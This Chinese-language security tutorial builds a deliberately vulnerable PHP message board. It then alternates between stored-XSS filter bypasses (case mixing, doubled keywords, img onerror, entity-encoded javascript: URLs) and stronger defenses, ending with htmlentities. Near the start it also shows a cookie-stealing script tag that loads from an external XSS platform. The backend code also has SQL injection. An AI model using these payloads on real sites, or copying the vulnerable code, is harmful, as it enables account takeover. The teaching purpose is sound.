> 不想做开发的黑客不是好黑客。  
>

**本文只对存储型XSS进行分析。那么，什么是存储型XSS呢？**

它是通过对网页注入可执行代码且成功地被浏览器执行，达到攻击的目的，一般是注入一段javascript脚本。在测试过程中，我们一般是使用：

    
    
    <script>alert(1)</script>

通过这段js代码，弹个框来证明存在xss漏洞。那么，可能新手就会问了，弹个框有什么用呢？

其实，弹框只是为了证明存在此漏洞。而此漏洞的利用方式由很多种。

比如，你可以使用xss平台：

![1.png](https://image.3001.net/images/20191016/1571237076_5da72cd4743b3.png!small)写入一段平台生成的xss脚本：

    
    
    <script src=//xsspt.com/ZsgUBf></script>

当某人进入带有这个脚本的页面时，js脚本会获取他的cookie并发往xss平台。

你只需要登录xss平台等待即可，拿到cookie后，可以不需要密码登录他的账号。

**注意：本文的重点是一步一步以黑客的角度进行xss攻击，再讨论如何站在开发者的角度去一步一步防御xss攻击。所以我会在本文中以开发的身份修正后端代码，再以黑客的身份进行前端页面的xss攻击，这一点需要注意哦。**

对于存储型xss漏洞的表现形式，比较经典的是留言板。但是我们都是遵纪守法的好同学，不能对外面的网站进行测试，所以就花半个小时自己手撸一个留言板咯。

首先，应该有前端展示的页面Message_Board.php和后端存储数据的页面addMessage.php

![2.png](https://image.3001.net/images/20191030/1572434179_5db9710329b9a.png!small)

![](http://note.youdao.com/yws/res/118/046B2099E9784A079FD1E8448895A17C)

前端代码不是本文重点（感兴趣的可以去看看我的代码：[https://github.com/BrucessKING/Back-stage-Management](https://github.com/BrucessKING/Back-stage-Management)）

我们重点关注后端代码addMessage.php：

    
    
    <?php
    	$nickname = @$_POST['nickname'];//昵称
    	$email = @$_POST['email'];//邮箱
    	$content = @$_POST['content'];//留言内容
    	$now_time = @$_POST['now_time'];//留言时间
    	$ini= @parse_ini_file("config.ini");
        $con = @mysql_connect($ini["servername"],$ini["username"],$ini["password"]);
    	if($con){
    		mysql_query("set names 'utf8'");//解决中文乱码问题
    		mysql_select_db($ini["dbname"]);
    		$sql1 = "select count(*) from message_board";
    		$result = mysql_query($sql1);
    		$floor = mysql_fetch_row($result)[0] + 1;
    		$sql = "insert into message_board values($floor,\"$nickname\",\"$email\",\"$content\",\"$now_time\")";
    		mysql_query($sql);
    	}
    
    ?>  
    

可以看到，我们对传入的四个参数完全没有处理，而是直接存入数据库中。

所以，只要我们这样输入：

![3.png](https://image.3001.net/images/20191030/1572434205_5db9711d699e9.png!small)

![](http://note.youdao.com/yws/res/186/5807971E417E4AE182E83967AA46D3B1)提交之后，系统会自动刷新页面出现弹框：

![4.png](https://image.3001.net/images/20191030/1572434238_5db9713e4f4de.png!small)

![](http://note.youdao.com/yws/res/194/56554CFA60974FC2B315DDB072E53C38)点击确定后，你会发现留言内容和留言者的部分都为空。

![5.png](https://image.3001.net/images/20191030/1572434262_5db971569ae9e.png!small)

这是因为js脚本已经被解析了，这时我们按F12，打开浏览器的开发者工具，发现了js脚本。

![](http://note.youdao.com/yws/res/201/E77A77F37001406FA8EADFA42CC924C3)![6.png](https://image.3001.net/images/20191030/1572434290_5db9717202dd0.png!small)

那么，问题来了。

毕竟我们还有另外一个身份，开发者该如何防御呢？

##  **0x00、来个最简单的，只修改前端代码**

在input标签里面加上maxlength属性

    
    
    <input type="text" name="nickname" placeholder="留言者昵称" maxlength="10">  
    

至于原理嘛，就是因为js脚本的形式为<script></script>长度为17，所以只要我们在前端对长度进行限制，就可以阻止黑客进行xss攻击了

 **可是！开发可没这么好做！**

我们是想做开发的黑客，所以还得自己搞自己。

作为攻击者，我们同样可以修改前端代码，具体的操作是使用浏览器的F12（开发者工具）

![](http://note.youdao.com/yws/res/491/19F1E995B56B4B8096653F004E1E804C)![7.png](https://image.3001.net/images/20191030/1572434318_5db9718e69775.png!small)

可以看到，我们可以直接进行长度的修改。

另外，还可以用抓包的方法，在包里面直接写，也是不受长度限制的。

##  **0x01、对关键字script进行过滤**

作为开发者，你很容易发现，要想进行xss攻击，必须插入一段js脚本，而js脚本的特征是很明显的，脚本中包含script关键字，那么我们只需要进行script过滤即可。

回到之前的代码。

为方便说明，我只取nickname参数，其实传入的四个参数需要做同样的处理。

    
    
    $nickname = str_replace("script", "", @$_POST['nickname']);//昵称  
    

上面这个str_replace()函数的意思是把script替换为空。

可以看到，script被替换为空，弹框失败。

![8.png](https://image.3001.net/images/20191030/1572434352_5db971b06f416.png!small)

那么黑客该如何继续进行攻击呢？

 **答案是：大小写绕过**

    
    
    <sCrIPt>alert(1)</ScripT>  
    

![](http://note.youdao.com/yws/res/264/086F178740D940ECB5E0560EC1FF3002)![9.png](https://image.3001.net/images/20191030/1572434377_5db971c9ef422.png!small)

因为js是 **不区分大小写** 的，所以我们的大小写不影响脚本的执行

 **成功弹框**

##
**![10.png](https://image.3001.net/images/20191030/1572434395_5db971db951b0.png!small)![](http://note.youdao.com/yws/res/271/**9DDF5A6BE543788858F4AACEECFA06)![](http://note.youdao.com/yws/res/335/86B027FDE1FF4C9B9BBCA92B2F325645)**
**0x02、使用str_ireplace()函数进行不区分大小写地过滤script关键字** **  
**

作为一名优秀的开发，发现了问题当然要及时改正，不区分大小写不就行了嘛

后端代码修正如下：

    
    
    $nickname = str_ireplace("script", "", @$_POST['nickname']);//昵称  
    

str_ireplace()函数类似于上面的str_replace（），但是它不区分大小写。

那么，大黑阔该如何绕过？

 **答案是：双写script**

    
    
    <Sscriptcript>alert(1)</Sscriptcript>  
    

![](http://note.youdao.com/yws/res/328/2AB2B22BF14E412EA05450D4DCE8EDF2)![11.png](https://image.3001.net/images/20191030/1572434426_5db971fa060fe.png!small)

原理就是str_ireplace()函数只找出了中间的script关键字，前面的S和后面的cript组合在一起，构成了新的Script关键字。

弹框成功！

![12.png](https://image.3001.net/images/20191030/1572434447_5db9720fc7d84.png!small)

##  **0x03、使用preg_replace()函数进行正则表达式过滤script关键字**  

    
    
    $nickname = preg_replace( "/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i", "", @$_POST['nickname']);//昵称  
    

显然，弹框失败。  

![](http://note.youdao.com/yws/res/341/C5461EB1002643D28A505B1D2A3D5B84)![13.png](https://image.3001.net/images/20191030/1572434475_5db9722b0f868.png!small)

 **攻击者如何再一次绕过？**

 **答案是：用img标签的oneerror属性**

    
    
    <img src=x onerror=alert(1)>  
    

##  **0x04、过滤alert关键字**

看到这里，不知道你烦了没有，以开发的角度来讲，我都有点烦。大黑阔你不是喜欢弹窗么？我过滤alert关键字看你怎么弹！

    
    
    $nickname = preg_replace( "/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i", "", @$_POST['nickname']);//昵称
    $nickname = preg_replace( "(.*)a(.*)l(.*)e(.*)r(.*)t/i", "", $nickname);//昵称  
    

 **那么，攻击者该怎么办呢？**

 **答案是：编码绕过**

    
    
    <a href=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>a</a>  
    

当点击页面上的超链接时，会弹框。  

![14.png](https://image.3001.net/images/20191030/1572434515_5db97253eb00b.png!small)

但是为什么呢？  

这种编码方式为 **字符编码**

 **字符编码** ：十进制、十六进制ASCII码或unicode 字符编码，样式为“&#数值;”, 例如“j”可以编码为“&#106;”或“&#x6a;
”

上述代码解码之后如下：

    
    
    <a href=javascript:alert(1)>a</a>  
    

你能明显感觉到限制：由于使用到了a标签，所以只有点击时，才会弹框。  

作为一个大黑阔，我们当然是不满意的，能不能让所有进入这个页面的人都弹框？

当然可以了： **用iframe标签编码**

    
    
    <iframe src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>  
    

这种写法，同样既没有script关键字，又没有alert关键字。  

![15.png](https://image.3001.net/images/20191030/1572434557_5db9727d19945.png!small)

可以看到弹框成功！  

![](http://note.youdao.com/yws/res/310/4BDBBEE28F874962A8A463C8ADC88EC8)![16.png](https://image.3001.net/images/20191030/1572434581_5db972950d3e7.png!small)

可是你也能看到，由于使用了iframe标签，留言板的样式已经变形了。实战中尽量不要用。

##  **0x05、过滤特殊字符**

优秀的开发，永不认输！你个小小的黑阔，不就是会插入js代码么？我过滤特殊字符，看你代码咋被解析？

可是我不想手撸代码来列举那么多特殊字符怎么办？

php给我们提供了htmlentities()函数：

    
    
    $nickname = htmlentities(@$_POST['nickname']);//昵称  
    

htmlentities()函数的作用是把字符转换为 HTML 实体。

显示结果 | 描述 | 实体名称 | 实体编号  
---|---|---|---  
| 空格 | &ampnbsp | &#160;  
< | 小于号 | &amplt | &#60;  
> | 大于号 | &ampgt | &#62;  
& | 和号 | &ampamp | &#38;  
" | 引号 | &ampquot | &#34;  
' | 撇号  | &ampapos (IE不支持) | &#39;  
￠ | 分（cent） | &ampcent | &#162;  
£ | 镑（pound） | &amppound | &#163;  
¥ | 元（yen） | &ampyen | &#165;  
€ | 欧元（euro） | &ampeuro | &#8364;  
§ | 小节 | &ampsect | &#167;  
© | 版权（copyright） | &ampcopy | &#169;  
® | 注册商标 | &ampreg | &#174;  
™ | 商标 | &amptrade | &#8482;  
× | 乘号 | &amptimes | &#215;  
÷ | 除号 | &ampdivide | &#247;  
  
看到这里，你可能还是不明白HTML字符实体是什么。我举个例子吧，当你想在HTML页面上显示一个小于号（<）时，浏览器会认为这是标签的一部分（因为所有标签都由大于号，标签名和小于号构成），因此，为了能在页面上显示这个小于号（<），我们引入了HTML字符实体的概念，能够在页面上显示类似于小于号（<）这样的特殊符号，而不会影响到页面标签的解析。

可以看到，我们输入的内容全部显示在页面上了。

![](http://note.youdao.com/yws/res/451/01F8F167C63446889352109D7D0FFD8F)![17.png](https://image.3001.net/images/20191030/1572434614_5db972b65c4b4.png!small)

可是却没有弹框。

我们鼠标右键，查看网页源代码：

![18.png](https://image.3001.net/images/20191030/1572434641_5db972d1c4f98.png!small)

实际上，我们输入的内容已经变成了HTML实体：  

    
    
    &ampltiframe src=&ampamp#106;&ampamp#97;&ampamp#118;&ampamp#97;&ampamp#115;&ampamp#99;&ampamp#114;&ampamp#105;&ampamp#112;&ampamp#116;&ampamp#58;&ampamp#97;&ampamp#108;&ampamp#101;&ampamp#114;&ampamp#116;&ampamp#40;&ampamp#49;&ampamp#41;&ampgt  
    

无法被解析为js脚本。

黑客在当前场景下已经无法攻击了（在某些其他场景，即使使用了htmlentities()函数，仍然是可以攻击的，这就不在本文讨论范围之内了）

##  **0x06、总结**

开发者不应该只考虑关键字的过滤，还应该考虑特殊符号的过滤 。

黑客在面对未知的情况时，要不断尝试，这对于知识的储备量有较高的要求。

对于xss攻击，站在开发者角度来讲，仅仅用一个htmlentities()函数基本可以做到防御，可是一个优秀的开发者应该明白它的原理。站在黑客的角度来讲，面对环境的逐步变化，条件的逐步限制，攻击思路灵活变化是对整个职业生涯有益的。

最后，我要说一句，java天下第一！  

 ***本文原创作者：ABKing，属于FreeBuf原创奖励计划，未经许可禁止转载**

